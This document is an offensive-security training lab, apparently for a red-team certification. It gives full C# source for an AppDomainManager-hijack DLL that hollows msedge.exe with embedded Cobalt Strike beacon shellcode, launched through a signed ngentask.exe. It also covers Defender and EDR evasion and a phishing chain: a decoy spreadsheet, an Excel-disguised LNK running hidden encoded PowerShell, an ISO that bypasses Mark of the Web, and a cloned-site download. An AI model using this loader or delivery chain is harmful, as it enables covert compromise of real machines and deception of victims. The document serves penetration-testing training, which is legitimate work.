# Initial Access Lab

> **Read this first — two scenarios, one lab**
>
> This lab covers techniques used in two different contexts. Understanding which applies to
> the exam saves you wasting time on steps that are not needed on exam day.
>
> | Scenario | When it applies | What you do |
> |----------|----------------|-------------|
> | **Exam (assume-breach)** | You are given creds and can log into the foothold workstation yourself | Build the DLL on the dev box, copy to workstation, set env vars, run `ngentask.exe` manually — no ISO, no LNK, no social engineering |
> | **Real engagement (no direct access)** | You cannot log in — you need a user to execute something for you | The full chain: payload → decoy → LNK trigger → ISO container → delivery via CS site clone |
>
> **The exam does NOT require you to socially engineer anyone.** The phishing delivery
> chain (decoy, LNK, ISO, site clone) teaches real-world tradecraft. On exam day you run
> the payload yourself on the machine you already have access to.
>
> **What both scenarios share:** the core payload technique —
> AppDomainManager injection via `ngentask.exe` + process hollowing into `msedge.exe`.
> That is what this lab is really teaching. Everything else is the delivery wrapper.

---

## The Core Technique — AppDomainManager Injection

**Why this technique exists (the problem it solves):**

You need to run a beacon on a machine with Defender ON. Simply running `http_x64.exe` gets
blocked — the exe artifact is flagged by static or memory scan. You need a way to execute
shellcode that:
- Does not use a suspicious loader process (no `rundll32.exe`, no `regsvr32.exe`)
- Places the beacon inside a process that legitimately makes network connections
- Does not write obvious malware to disk (the loader itself must be clean)

**How AppDomainManager injection solves this:**

.NET Framework applications support a feature called `AppDomainManager` — it lets you hook
into the startup of any .NET app and run your own code before the app's real code runs.
You exploit this by:

1. Building a malicious DLL that inherits from `AppDomainManager` and contains your beacon shellcode
2. Setting two environment variables (`APPDOMAIN_MANAGER_TYPE` and `APPDOMAIN_MANAGER_ASM`)
   that tell the .NET runtime to load YOUR DLL as the domain manager
3. Running any .NET Framework binary — the runtime loads your DLL automatically before the
   app starts, executing your code in the context of a legitimate, signed Microsoft binary

**Why `ngentask.exe` specifically:**

`ngentask.exe` is a legitimate Microsoft-signed .NET Framework binary (`ngen` = Native Image
Generator, part of the .NET runtime). The version from `WinSxS` is an older build that still
has the DLL search path vulnerability that makes this technique work. Crucially:
- It is a signed Microsoft binary — Defender trusts it
- It is a .NET Framework app — the `APPDOMAIN_MANAGER` env vars apply to it
- It does nothing visible when run — no window, no output — so it runs silently
- It exists on every Windows system with .NET Framework installed

**Why `msedge.exe` as the injection target:**

The shellcode performs **process hollowing** into `msedge.exe`:
- Microsoft Edge legitimately makes outbound HTTPS/HTTP connections — perfect cover for beacon C2 traffic
- Edge is expected to be running on any workstation — its presence in the process list is not suspicious
- Beacon's C2 callbacks look like browser traffic (`Host: www.bleepincomputer.com` from an Edge process)
- If the EDR checks which process is making outbound connections, it sees Edge

**OPSEC summary of the full technique:**

| Component | OPSEC | Why |
|-----------|-------|-----|
| AppDomainHijack.dll on disk | CAUTION | A DLL must exist on disk — run ThreatCheck against it |
| ngentask.exe execution | SAFE | Signed Microsoft binary — not suspicious to run |
| APPDOMAIN env vars | SAFE | Set in process memory only — no registry, no disk write |
| Process hollowing into msedge.exe | SAFE | Beacon runs inside legitimate Edge browser process |
| Beacon C2 traffic from msedge.exe | SAFE | Edge legitimately makes HTTP outbound — traffic blends in |

---

# Payload

> **EXAM DAY — do this on the Windows attacker dev box before touching the exam workstation.**
> The DLL you build here is what you will copy to (or run from) the foothold machine.
> Defence evasion setup (Artifact Kit, Resource Kit, malleable profile) must already be done.

## Step 1 — Generate raw Beacon shellcode

1. Launch Cobalt Strike and connect to the team server.
2. Generate Beacon shellcode.
    1. Go to **Payloads > Windows Stageless Payload**.
    2. Listener: **http**
    3. Output: **Raw**
    4. Click **Generate**.
    5. Save to *C:\Payloads\http_x64.xprocess.bin*.

> **Why raw output and not exe?** You are embedding the shellcode inside a custom .NET DLL
> loader that you control. The DLL is the artifact — not a CS-generated exe. Raw output gives
> you the pure shellcode bytes to embed as a resource. The Artifact Kit you built earlier
> handles CS-generated exe/dll/ps1 artifacts — this DLL is your own custom loader, so you
> control the evasion yourself.
>
> **Why `.xprocess.bin` naming?** The extension `.xprocess.bin` is arbitrary — it is used
> so that when added to the Visual Studio project, it can be set as an Embedded Resource.
> The name is also referenced in the code as `AppDomainHijack.http_x64.xprocess.bin` — the
> resource stream name is the namespace + filename.

<img src="/images/initial-access-lab-01.png" width=800>  

## Step 2 — Create the project directory

1. Open a Terminal window and create a new directory to hold the dependencies for the infection chain.
  1. `mkdir C:\Payloads\deals`

> **Why a separate directory?** The full infection chain (DLL + ngentask.exe + decoy + LNK)
> needs to co-locate. When the trigger runs, the current working directory must contain all
> these files because ngentask.exe searches the CWD for the DLL to sideload.

## Step 3 — Build the AppDomainHijack DLL

1. Open Visual Studio and create a new `Class Library (.NET Framework)` project.

⚠️ Make sure it specifically says `.NET Framework`, otherwise it won't work.  

    1. Use `AppDomainHijack` as the project name.
    2. Check the *place solution and project in the same directory* box.

> **Why `.NET Framework` specifically (not .NET Core / .NET 5+)?** The `AppDomainManager`
> class and the `APPDOMAIN_MANAGER_*` environment variables only apply to the legacy .NET
> Framework runtime (CLR 4.x). Modern .NET (Core/5/6/7/8) uses a different hosting model
> and ignores these variables. `ngentask.exe` from WinSxS runs on .NET Framework — so your
> DLL must target the same runtime.

<img src="/images/initial-access-lab-02.png" width=800>  

3. Add the shellcode to the project.
    1. Right-click the project in the Solution Explorer and select **Add > Existing Item**.
    2. Browse to *C:\Payloads*.
    3. Change the file filter to *All Files*.
    4. Select *http_x64.xprocess.bin* and click **Add**.
    5. Right-click the shellcode file in the Solution Explorer and select **Properties**.
    6. Set its *Build Action* to **Embedded Resource**.

> **Why Embedded Resource?** Setting the shellcode as an Embedded Resource compiles the raw
> bytes directly into the DLL's `.rsrc` section. At runtime, the code reads it via
> `Assembly.GetManifestResourceStream(...)` — the shellcode never touches disk again after
> the initial DLL build. The bytes are inside the DLL itself.
>
> **OPSEC note:** The raw shellcode is stored unencrypted inside the DLL's resource section.
> Defender will scan it there. Run ThreatCheck against the compiled DLL — if flagged, you need
> to XOR-encrypt the shellcode bytes in the resource and decrypt them in `InitializeNewDomain`
> before calling `WriteProcessMemory`. The lab assumes the Malleable C2 profile's stage block
> modifications make the beacon shellcode bytes unrecognisable — confirm with ThreatCheck.

<img src="/images/initial-access-lab-03.png" width=800>  

4. Copy the following code into `Class1.cs`:  

    ```c
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
      
    namespace AppDomainHijack
    {
        public sealed class DomainManager : AppDomainManager
        {
            public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
            {
                var si = new STARTUPINFOA
                {
                    cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                    dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
                };
      
                // create hidden + suspended msedge process
                var success = CreateProcessA(
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                    "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                    ref si,
                    out var pi);
      
                if (!success)
                    return;
      
                // get basic process information
                var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                var lpPbi = Marshal.AllocHGlobal(szPbi);
      
                NtQueryInformationProcess(
                    pi.hProcess,
                    PROCESSINFOCLASS.ProcessBasicInformation,
                    lpPbi,
                    (uint)szPbi,
                    out _);
      
                // marshal data to structure
                var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
                Marshal.FreeHGlobal(lpPbi);
      
                // calculate pointer to image base address
                var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
      
                // buffer to hold data, 64-bit addresses are 8 bytes
                var bImageBaseAddress = new byte[8];
      
                // read data from spawned process
                ReadProcessMemory(
                    pi.hProcess,
                    lpImageBaseAddress,
                    bImageBaseAddress,
                    8,
                    out _);
      
                // convert address bytes to pointer
                var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
      
                // read pe headers
                var data = new byte[512];
      
                ReadProcessMemory(
                    pi.hProcess,
                    baseAddress,
                    data,
                    512,
                    out _);
      
                // read e_lfanew
                var e_lfanew = BitConverter.ToInt32(data, 0x3C);
      
                // calculate rva
                var rvaOffset = e_lfanew + 0x28;
                var rva = BitConverter.ToUInt32(data, rvaOffset);
      
                // calculate address of entry point
                var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
      
                // read the shellcode
                byte[ ] shellcode;
      
                var assembly = Assembly.GetExecutingAssembly();
      
                using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
                {
                    // convert stream to raw byte[ ]
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        shellcode = ms.ToArray();
                    }
                }
      
                // copy shellcode into address of entry point
                WriteProcessMemory(
                    pi.hProcess,
                    lpEntryPoint,
                    shellcode,
                    shellcode.Length,
                    out _);
      
                // resume process
                ResumeThread(pi.hThread);
            }
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool CreateProcessA(
                string applicationName,
                string commandLine,
                IntPtr processAttributes,
                IntPtr threadAttributes,
                bool inheritHandles,
                PROCESS_CREATION_FLAGS creationFlags,
                IntPtr environment,
                string currentDirectory,
                ref STARTUPINFOA startupInfo,
                out PROCESS_INFORMATION processInformation);
      
            [DllImport("ntdll.dll", ExactSpelling = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint NtQueryInformationProcess(
                IntPtr processHandle,
                PROCESSINFOCLASS processInformationClass,
                IntPtr processInformation,
                uint processInformationLength,
                out uint returnLength);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool ReadProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[ ] buffer,
                UInt64 size,
                out uint numberOfBytesRead);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool WriteProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[ ] buffer,
                int size,
                out int numberOfBytesWritten);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint ResumeThread(IntPtr threadHandle);
        }
      
        [Flags]
        public enum PROCESS_CREATION_FLAGS : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
        }
      
        public struct STARTUPINFOA
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public STARTUPINFO_FLAGS dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
      
        [Flags]
        public enum STARTUPINFO_FLAGS : uint
        {
            STARTF_FORCEONFEEDBACK = 0x00000040,
            STARTF_FORCEOFFFEEDBACK = 0x00000080,
            STARTF_PREVENTPINNING = 0x00002000,
            STARTF_RUNFULLSCREEN = 0x00000020,
            STARTF_TITLEISAPPID = 0x00001000,
            STARTF_TITLEISLINKNAME = 0x00000800,
            STARTF_UNTRUSTEDSOURCE = 0x00008000,
            STARTF_USECOUNTCHARS = 0x00000008,
            STARTF_USEFILLATTRIBUTE = 0x00000010,
            STARTF_USEHOTKEY = 0x00000200,
            STARTF_USEPOSITION = 0x00000004,
            STARTF_USESHOWWINDOW = 0x00000001,
            STARTF_USESIZE = 0x00000002,
            STARTF_USESTDHANDLES = 0x00000100
        }
      
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
      
        public enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0
        }
      
        public struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public ulong AffinityMask;
            public int BasePriority;
            public ulong UniqueProcessId;
            public ulong InheritedFromUniqueProcessId;
        }
    }
    ```

> **What this code does — step by step:**
>
> The `DomainManager` class inherits from `AppDomainManager`. The .NET runtime calls
> `InitializeNewDomain()` automatically when the host process starts — before the app's
> real code runs. Everything inside that method is your malicious execution.
>
> **Phase 1 — Spawn a hidden, suspended Edge process (process hollowing setup):**
> ```
> CreateProcessA(msedge.exe, CREATE_SUSPENDED | CREATE_NO_WINDOW, ...)
> ```
> Edge is launched with `CREATE_SUSPENDED` — the main thread is created but not running.
> `CREATE_NO_WINDOW` makes it completely invisible. The process exists in memory but has
> not executed a single instruction of its own code yet. You now own its memory space.
>
> **Phase 2 — Find the entry point of the suspended Edge process:**
> ```
> NtQueryInformationProcess → read PEB → read image base → read PE headers → calculate entry point
> ```
> The PEB (Process Environment Block) is a Windows structure containing the base address of
> the loaded executable. Adding `0x10` to the PEB address gives the `ImageBaseAddress` field.
> From there: read 512 bytes of the PE headers → find `e_lfanew` (offset to NT headers at
> `0x3C`) → read the `AddressOfEntryPoint` RVA at `e_lfanew + 0x28` → calculate absolute
> entry point address = base + RVA.
>
> **Phase 3 — Read shellcode from embedded resource:**
> ```
> Assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin")
> ```
> Reads the raw beacon shellcode bytes from the DLL's embedded resource section into a
> `byte[]` array. The shellcode never touches disk — it was compiled into the DLL.
>
> **Phase 4 — Write shellcode over Edge's entry point:**
> ```
> WriteProcessMemory(pi.hProcess, lpEntryPoint, shellcode, ...)
> ```
> Overwrites the suspended Edge process's entry point code with your beacon shellcode.
> When the thread resumes, instead of running Edge's startup code it executes your shellcode.
>
> **Phase 5 — Resume the thread:**
> ```
> ResumeThread(pi.hThread)
> ```
> Unfreezes the main thread. Edge's entry point is now your shellcode → beacon executes →
> beacon calls back to team server → beacon session appears in CS running as `msedge.exe`.
>
> **OPSEC:** `WriteProcessMemory` from a .NET process into `msedge.exe` is visible to EDR
> hooks on this API call. The parent process is `ngentask.exe` (legitimate). The cross-process
> write is the most detectable moment — it is why the malleable profile's stage block
> settings (no RWX, module stomping, string replacement) must be active so the written
> shellcode does not match known beacon signatures in memory.

⚠️ Process Hollowing
⚠️ Above is the process hollowing code from the ***Malware Essentials chapter***.

## Step 4 — Build and stage the DLL

1. Build the project in Release mode.

	The DLL should be written to the following path: *C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll*.

⚠️ If your path contains something like *net8.0*, then you chose the wrong project type on step 2.  

> **Before copying: run ThreatCheck against the compiled DLL.**
> ```cmd
> ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
> ```
> If Defender flags the DLL: the embedded shellcode bytes are being matched by a static
> signature. Solutions: XOR-encrypt the shellcode in the embedded resource and decrypt it
> at runtime in `InitializeNewDomain` before passing to `WriteProcessMemory`, OR regenerate
> the shellcode after confirming your malleable C2 profile stage block is applied correctly
> (the profile modifies beacon DLL strings that the raw shellcode bytes may still contain).

1. Go ahead and copy the DLL to the deals payload directory.

	```Terminal-nocolor
	cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
	```

===

## NGenTask

> **Why ngentask.exe — and why the WinSxS version specifically:**
>
> `ngentask.exe` is the .NET Native Image Generator task runner — a signed Microsoft binary
> that is part of the .NET Framework. It does nothing visible when executed with no arguments.
>
> The version in `WinSxS` is an older build. WinSxS (Windows Side-by-Side) is a component
> store that keeps multiple versions of system DLLs and executables to support compatibility.
> Older .NET Framework builds in WinSxS are less patched and more likely to still follow the
> DLL search order that allows AppDomainManager injection via env vars.
>
> When `ngentask.exe` starts, the .NET runtime checks for `APPDOMAIN_MANAGER_TYPE` and
> `APPDOMAIN_MANAGER_ASM` environment variables. If set, the runtime loads the specified
> assembly as the AppDomainManager — **before** ngentask's own code runs. Your
> `DomainManager.InitializeNewDomain()` fires immediately, spawning and hollowing Edge,
> then ngentask exits silently. The entire execution is: signed Microsoft binary runs →
> your DLL loads → beacon spawned in Edge → ngentask exits.
>
> **OPSEC:** SAFE. `ngentask.exe` is a signed Microsoft binary. Its execution does not
> appear suspicious. The APPDOMAIN env vars are set in the current process environment
> only — no registry writes, no disk changes. The only disk artifact is `AppDomainHijack.dll`.

1. Copy the SxS version of ngentask.exe into the deals payload directory.

	```Terminal-nocolor
    cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
    ```

> **Why copy it into the deals directory?** The AppDomainManager injection requires the DLL
> (`AppDomainHijack.dll`) to be resolvable by the .NET runtime when loading it. The simplest
> way is to have both `ngentask.exe` and `AppDomainHijack.dll` in the same directory — the
> runtime searches the app's directory first. Running `ngentask.exe` from `C:\Payloads\deals\`
> with the DLL present in the same directory satisfies this requirement.

### Sanity test — verify the technique works before building the delivery chain

> **EXAM RELEVANCE:** This sanity test is exactly what you do on exam day on the foothold
> workstation — set the env vars, run `ngentask.exe`. No LNK, no ISO, no social engineering.
> This is your initial beacon spawn sequence.

1. Launch Cobalt Strike and connect to the team server.
1. Move into the deals payload directory and set the AppDomain environment variables:

	```PowerShell-linenums
    cd C:\Payloads\deals
    $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
    $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
    ```

> **What these environment variables do:**
>
> `APPDOMAIN_MANAGER_TYPE` — the fully-qualified type name of your custom `AppDomainManager`
> class. Format: `<Namespace>.<ClassName>`. Here: `AppDomainHijack.DomainManager`.
>
> `APPDOMAIN_MANAGER_ASM` — the assembly identity of your DLL. Format matches the .NET
> assembly identity format: `<AssemblyName>, Version=<version>, Culture=<culture>, PublicKeyToken=<token>`.
> Since your DLL is unsigned (`PublicKeyToken=null`), the token is `null`.
>
> When `ngentask.exe` starts, the CLR reads these two env vars and loads your DLL,
> instantiates `DomainManager`, and calls `InitializeNewDomain()`. This is a legitimate
> .NET Framework feature being abused.
>
> **These vars are set only in the current PowerShell session's environment** — they are
> not written to disk or the registry. They disappear when the session ends.

<img src="/images/initial-access-lab-04.png" width=800>  

1. Run ```.\ngentask.exe```

⚠️ A new Beacon should appear, running in msedge.exe.

> **What to check after beacon appears:**
> ```cs
> beacon> getuid          // confirm running as the expected user
> beacon> getpid          // note the PID — verify it matches an msedge.exe process
> beacon> ps              // confirm beacon is inside msedge.exe, check for EDR processes
> ```
> If no beacon appears: check that the malleable C2 profile is loaded (docker logs), that
> the http listener is active, and that `AppDomainHijack.dll` is in the same CWD as
> `ngentask.exe`.

===

---

> ## EXAM DAY STOPS HERE — Steps below are for phishing delivery only
>
> The sections below (Decoy, Trigger, Container, Delivery) build a social engineering
> package to trick a user into executing the payload without knowing they are running malware.
>
> **In the assume-breach exam scenario you will NOT do any of this.** You already have
> credentials and can log in to the workstation. Run the env vars + `ngentask.exe` directly.
>
> Study the sections below to understand real-world phishing tradecraft — they may appear
> in future engagements or as context for OPSEC questions — but do not spend exam time
> building a decoy or LNK when you have direct workstation access.

---

# Decoy

> **Why a decoy file exists:**
>
> If the LNK trigger runs silently with no visible output, a suspicious user notices that
> nothing happened after clicking the file and may report it to the security team. A decoy
> opens a legitimate-looking document alongside the payload, so the user sees normal
> behaviour. The payload runs in the background — the user sees an Excel spreadsheet.
>
> **OPSEC:** SAFE — the decoy is a genuine Excel file with no macros. It is opened via
> `start deals.xlsx` in the LNK trigger command, which is a normal file-open action.

Next, create a decoy file.

1. Open Excel and create a new blank workbook.

⚠️ If you cannot create a workbook, close Excel, launch Terminal as a local admin, and run the following command: `& 'C:\Program Files\Microsoft Office\Office16\OSPPREARM.EXE'`

3. Add some dummy deals data.

    ```xlsx-nocolor
    id  product      discount  code
    1   Prodder      56%       54473-150
    2   Viva         9%        0378-5713
    3   Aerified     22%       43742-0187
    4   Zaam-Dox     26%       35356-687
    5   Rank         41%       63323-300
    6   Pannier      61%       50804-302
    7   Wrapsafe     32%       67046-223
    8   Voltsillam   58%       55910-721
    9   Ventosanzap  4%        0485-0051
    10  Otcom        54%       36987-2281
    ```

1. Save the workbook as *C:\Payloads\deals\deals.xlsx*.
2. Close Excel.

<img src="/images/initial-access-lab-05.png" width=860>  

===

# Trigger

> **Why a LNK trigger and not just a bat/exe:**
>
> A `.lnk` (Shell Link / shortcut) file has two properties that make it ideal for phishing:
> 1. **Windows Explorer hides the `.lnk` extension by default** — even with "show file
>    extensions" enabled, `.lnk` is hidden. A file named `deals.xlsx.lnk` displays as
>    `deals.xlsx` in Explorer. The victim sees what looks like an Excel spreadsheet.
> 2. **You can set any icon** — using the Excel icon makes the file look exactly like a
>    spreadsheet. The victim has no visual indication it is a shortcut.
>
> The LNK runs `cmd.exe` with a hidden PowerShell command that:
> - Opens the decoy spreadsheet (`start deals.xlsx`) so the user sees normal behaviour
> - Sets the APPDOMAIN env vars in memory
> - Runs `ngentask.exe` to execute the payload
>
> **OPSEC — CAUTION:** The execution chain is:
> `Explorer.exe → cmd.exe (/C) → powershell.exe (-w hidden -enc) → ngentask.exe`
>
> This parent-child chain is visible to EDR:
> - `cmd.exe` spawned by `Explorer.exe` when a user double-clicks → not suspicious by itself
> - `powershell.exe` spawned by `cmd.exe` with `-enc` (base64 encoded command) → flagged
>   by many EDR rules as obfuscation
> - `ngentask.exe` spawned by `powershell.exe` → unusual parent for this binary
>
> For a real engagement, replace the `-enc` PowerShell invocation with a less-signatured
> execution method (e.g. call `ngentask.exe` via a COM object, or use `wscript.exe` with
> a JS dropper instead of PowerShell). For the CRTO lab, the technique is demonstrated
> as-is — the focus is on the AppDomainManager injection, not the trigger OPSEC.

Now for the trigger. The user will run this which will subsequently launch the decoy and payload at the same time.

1. Generate a PowerShell one-liner that will set the required environment variables and execute ngentask.exe.

    ```PowerShell-linenums
    cd C:\Payloads\deals\
    $cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
    $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    ```

> **What this does:** Builds the payload command string and base64-encodes it (Unicode, as
> PowerShell's `-enc` parameter expects UTF-16LE encoding). The encoded string is stored in
> `$enc` and embedded into the LNK shortcut's `Arguments` field in the next step.
> PowerShell's `-enc` flag accepts base64-encoded commands — this avoids needing to escape
> quotes and special characters in the LNK `Arguments` field.

1. In the same window, create the shortcut that will execute the above one-liner and open the decoy.

    ```PowerShell-linenums
    $wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
    $lnk.TargetPath = "%COMSPEC%"
    $lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
    $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
    $lnk.Save()
    ```

> **What each LNK property does:**
>
> `TargetPath = "%COMSPEC%"` — runs `cmd.exe`. The LNK calls cmd rather than PowerShell
> directly because PowerShell cannot be set as the target of a shortcut without showing the
> console window. `cmd.exe /C` is the wrapper.
>
> `Arguments = "/C start deals.xlsx && powershell.exe -w hidden -enc $enc"` — cmd runs two
> things: `start deals.xlsx` (opens the decoy spreadsheet via its default app) and then
> `powershell.exe -w hidden -enc $enc` (runs the payload command invisibly). `-w hidden`
> prevents a PowerShell window from appearing.
>
> `IconLocation = "EXCEL.EXE,0"` — sets the LNK icon to Excel's icon (index 0 = the main
> application icon). The victim sees an Excel-looking file. Combined with the hidden `.lnk`
> extension, this is the deception.

<img src="/images/initial-access-lab-trigger.png" width=1024>  

## Validate and sanity test

1. Open Explorer and navigate to *C:\Payloads\deals*.
2. Double-click on *deals.xlsx.lnk*.

⚠️ The spreadsheet will open and a new Beacon should appear at the same time.

<img src="/images/initial-access-lab-06.png" width=1024>  

===

# Container

> **Why an ISO container — Mark of the Web (MotW):**
>
> When a file is downloaded from the internet (browser, email client, web download), Windows
> attaches an NTFS Alternate Data Stream called `Zone.Identifier` to the file. This is the
> **Mark of the Web (MotW)**. MotW causes:
> - Office documents → open in **Protected View** (macros disabled, content blocked)
> - Executables → trigger **SmartScreen** warnings before running
> - LNK files → trigger a warning dialog before executing
>
> **ISO and IMG files do NOT propagate MotW to their contents.** When you mount an ISO
> and access the files inside, those files do not inherit the MotW of the ISO container.
> The LNK inside the ISO has no MotW → no warning dialog → victim double-clicks it and
> the payload runs without any security prompt.
>
> **OPSEC:** SAFE — mounting and browsing an ISO is a normal user action (software
> distribution, game installs). The ISO itself may get a SmartScreen check, but once
> mounted, the files inside run without MotW friction.
>
> The `-H` flag to PackMyPayload hides files inside the ISO — only the LNK trigger is
> visible when the victim opens the mounted ISO. The DLL, ngentask.exe, and the real
> xlsx are hidden, preventing the victim from noticing the malicious components.

It's time to package all of our files.  We want to hide everything, except the lnk trigger.

1. Open Ubuntu (WSL) in Terminal, and use PackMyPayload to package all the files into an ISO.

    ```ubuntu-nocolor
    python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
    ```

> **Command breakdown:**
>
> `python3 PackMyPayload.py` — the tool that creates ISO/IMG/ZIP containers
>
> `-H deals.xlsx,ngentask.exe,AppDomainHijack.dll` — hide these files inside the ISO.
> They are included but not visible when the victim browses the mounted ISO in Explorer.
>
> `/mnt/c/Payloads/deals/` — source directory. All files here are packed into the ISO.
>
> `/mnt/c/Payloads/deals/deals.iso` — output ISO file path.
>
> **Result:** victim mounts the ISO → sees only `deals.xlsx.lnk` (looks like a spreadsheet)
> → double-clicks → decoy opens, payload executes → all hidden components ran without the
> victim ever seeing them.

## Final Validation sanity Check

1. Double-click on the ISO to mount it and you should only see the trigger.
2. Double-click on the trigger a final time, and the decoy and Beacon should appear.

<img src="/images/initial-access-lab-07.png" width=1024>  

===

# Delivery

> **What this section is:** Simulating the final step of a phishing campaign — getting the
> ISO to the victim and triggering the download. In the lab this is simulated by browsing
> to a CS-hosted page. In a real engagement this would be a phishing email with a link,
> a cloned login page with an automatic download, or a vishing call directing the target
> to a URL.
>
> **CS Site Management — two components working together:**
>
> 1. **Host File** — CS's built-in web server serves the ISO file at a specified URI and
>    hostname. The victim's browser downloads `deals.iso` when it visits the URI.
>
> 2. **Clone Site** — CS fetches a legitimate webpage (here: `deals.bleepingcomputer.com`),
>    mirrors it locally, and serves it at your URI. When the victim visits your cloned page,
>    they see a legitimate-looking website. CS attaches the hosted ISO as an automatic
>    download — when the victim clicks anything on the cloned page, the ISO downloads.
>
> **Why `www.bleepincomputer.com` as the Local Host:**
> The HTTP `Host:` header of all traffic to your team server uses this value. Network
> monitoring sees `Host: www.bleepincomputer.com` — a legitimate security news site — not
> a raw IP address. See the defence-evasion lab for the full explanation of host header
> masquerading.
>
> **OPSEC of this delivery method:**
> - SAFE: The victim visits what looks like a real website (cloned content)
> - SAFE: The ISO download appears to come from a legitimate-looking hostname
> - CAUTION: The clone is served over HTTP (not HTTPS) — a sharp user may notice the lack
>   of padlock. In a real engagement use a valid TLS certificate on the team server.
> - CAUTION: CS's site clone is not a perfect mirror — some JS/CSS may fail to load.
>   Test the clone before using it against a real target.

We're finally ready to deliver the payload to the victim simulating social engineering, phishing, vishing, or other trickery.

